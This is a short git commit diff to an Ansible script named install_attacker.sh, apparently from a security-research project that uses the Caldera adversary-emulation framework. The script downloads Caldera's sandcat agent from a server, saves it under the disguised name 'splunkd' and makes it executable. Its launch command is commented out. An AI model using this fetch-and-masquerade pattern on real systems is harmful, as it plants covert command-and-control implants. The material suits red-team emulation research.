336673d3eb0a018000bf3d547abb8e9b0bd18839
lakshmi-adiga <ladiga@andrew.cmu.edu>
2026-02-01 17:16:37 -0500

    Changed install attacker script to work with Incalmo

--- ansible/caldera/install_attacker.sh
+++ ansible/caldera/install_attacker.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 server='http://'$1':8888';
-curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' $server/file/download > splunkd;
+curl -s -X POST -H 'File: sandcat.go' -H 'platform:linux' $server/file/download > splunkd;
 chmod +x splunkd;
 
 # ./splunkd -server $server -group red;
